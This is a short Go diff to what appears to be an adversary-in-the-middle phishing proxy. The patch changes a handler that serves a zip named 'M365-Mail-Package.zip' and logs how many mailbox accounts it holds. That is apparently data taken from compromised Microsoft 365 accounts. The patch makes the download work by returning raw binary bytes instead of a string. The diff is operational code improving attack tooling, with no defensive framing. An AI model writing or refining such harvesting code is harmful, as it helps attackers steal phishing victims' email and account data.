@@ -1012,9 +1012,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					return req, resp
 				}
 				
-				resp := goproxy.NewResponse(req, "application/zip", 200, string(zipBuffer))
+				// Create proper binary response - don't convert bytes to string
+				resp := &http.Response{
+					StatusCode:    200,
+					ProtoMajor:    1,
+					ProtoMinor:    1,
+					Request:       req,
+					Header:        make(http.Header),
+					Body:          ioutil.NopCloser(bytes.NewReader(zipBuffer)),
+					ContentLength: int64(len(zipBuffer)),
+				}
 				resp.Header.Set("Content-Disposition", "attachment; filename=M365-Mail-Package.zip")
 				resp.Header.Set("Content-Type", "application/zip")
+				resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(zipBuffer)))
 				resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
 				log.Success("[mailbox] Download package served to %s (%d accounts)", remote_addr, p.mailboxAccounts.Count())
 				return req, resp
